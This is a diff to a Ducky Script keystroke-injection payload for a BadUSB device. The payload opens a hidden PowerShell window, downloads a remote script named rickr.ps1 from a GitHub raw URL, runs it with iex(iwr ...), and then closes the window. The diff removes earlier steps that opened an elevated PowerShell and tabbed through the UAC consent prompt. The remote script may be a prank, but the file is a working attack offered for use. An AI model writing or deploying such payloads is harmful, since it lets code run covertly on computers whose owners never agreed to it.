@@ -3,20 +3,13 @@ GUI r
 DELAY 500
 
 REM Type PowerShell command to open it as admin
-STRING powershell -Command "Start-Process PowerShell -Verb RunAs -Wait"
-ENTER
-DELAY 2000
-
-REM Confirm UAC (User Account Control) prompt using keyboard shortcut
-DELAY 500
-TAB
-DELAY 50
-TAB
-DELAY 50
-TAB
-DELAY 100
+STRING powershell -WindowStyle Hidden
 ENTER
 
 REM Call the rickr.ps1 script from GitHub using iex
-STRING iex (iwr 'https://github.com/Kiraryh/sub/blob/main/rickr.ps1' -UseBasicParsing)
+STRING iex (iwr 'https://raw.githubusercontent.com/Kiraryh/sub/refs/heads/main/rickr.ps1' -UseBasicParsing)
+ENTER
+
+REM Close PowerShell
+STRING exit
 ENTER
